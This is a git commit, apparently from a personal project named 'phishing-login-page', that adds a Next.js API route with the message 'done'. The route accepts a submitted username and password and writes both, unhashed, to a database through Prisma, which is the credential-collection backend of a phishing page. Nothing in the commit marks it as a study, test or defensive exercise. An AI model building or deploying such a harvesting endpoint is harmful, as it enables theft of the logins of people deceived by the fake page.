7cd0979cd938ef447bf7e02c3ffd28c78bd9af82
Melvin2306 <melvin.rinkleff@gmx.de>
2023-11-10 00:06:09 +0100

    done

---
+++ phishing-login-page/src/app/api/login/route.ts
@@ -0,0 +1,17 @@
+import { PrismaClient } from "@prisma/client";
+
+export async function POST(request: Request) {
+  const prisma = new PrismaClient();
+  const res = await request.json();
+  const username = res.username;
+  const password = res.password;
+  const user = await prisma.user.create({
+    data: {
+      password: password,
+      username: username,
+    },
+  });
+  return new Response(JSON.stringify(user), {
+    headers: { "content-type": "application/json" },
+  });
+}
